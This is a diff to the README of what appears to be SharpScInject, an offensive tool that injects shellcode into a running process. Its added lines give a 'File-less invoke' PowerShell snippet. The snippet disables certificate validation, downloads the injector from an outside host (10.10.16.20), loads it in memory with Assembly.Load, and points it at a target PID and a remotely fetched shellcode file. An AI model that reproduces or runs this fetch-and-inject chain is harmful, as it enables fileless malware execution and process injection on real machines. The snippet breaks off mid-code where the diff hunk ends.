@@ -11,18 +11,15 @@ mcs /reference:System.Net.Http SharpScInject.cs
 
 ## Usage
 ```
-SharpScInject.exe <PID_or name> <Shell Code PATH / URL>
+SharpScInject.exe <PID or process_name> <Shell Code PATH / URL>
 ```
 
 
 File-less invoke
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
-$data = (New-Object System.Net.WebClient).DownloadData('https://192.168.xx.xx/file/ProcInject.exe')
-# $data=[System.IO.File]::ReadAllBytes('C:\Windows\Tasks\ProcInject.exe')
-
-$argument = "5278 https://192.168.xx.xx/file/my_shellcode.bin"
-
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.20/SharpScInject.exe')
+$argument = "5278 http://10.10.16.20/a.raw"
 $assem = [System.Reflection.Assembly]::Load($data)
 $method = $assem.Entrypoint
 $argu= New-Object -TypeName System.Collections.ArrayList
